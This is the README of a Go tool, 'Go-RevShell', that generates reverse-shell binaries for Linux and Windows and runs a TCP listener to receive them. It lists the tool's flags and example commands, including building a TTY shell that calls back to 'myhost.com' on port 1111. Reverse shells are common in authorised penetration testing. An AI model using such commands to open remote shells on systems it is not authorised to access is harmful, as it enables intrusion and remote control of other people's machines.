![Go-RevShell-Banner](img/Go-RevShell-Banner.jpeg)

Go-RevShell
=======

Pure standard Golang implementation of a reverse-shell generator and a tcp listener.

## Table of content
- [Go-RevShell](#go-revshell)
  - [Table of content](#table-of-content)
  - [Usage](#usage)
    - [Build a reverse shell](#build-a-reverse-shell)
    - [Attach to reverse shell](#attach-to-reverse-shell)
  - [Screenshots](#screenshots)
  - [Todo List](#todo-list)


## Usage
```text
  -i string
        IP of the host which the reverse shell will connect to. (default "localhost")
  -l string
        Port to listen (you can use this argument to bind to your reverse shell). (default "0")
  -p string
        Port of the host which the reverse shell will connect to. (default "1111")
  -s string
        OS of the server which will start the reverse shell (used to build the right binary) available : "windows", "linux". (default "linux")
  -t string
        Template to use to generate the reverse shell. Available : "native", "tty". (default "native")
```

### Build a reverse shell

* Build a native shell for linux server : ```go run main.go -s linux```
* Build a TYY shell for linux server : ```go run main.go -t tty -s linux```
* Build a TYY shell for linux server, with client ip and port : ```go run main.go -t tty -s linux -i myhost.com -p 1111```
* Build a native shell for windows server : ```go run main.go -s windows```

### Attach to reverse shell

* Listen to port 1111 ```go run main.go -l 1111```
* Listen to port 3412 ```go run main.go -l 3412```

## Screenshots

![Go-RevShell-Generate](img/Go-RevShell-Generate.png)
![Go-RevShell-Attach](img/Go-RevShell-Attach.png)

## Todo List

* More tests across differents os
* Add Windows payloads for pty
* Publish package
* Refresh and anon screenshots

**[`^        back to top        ^`](#)**
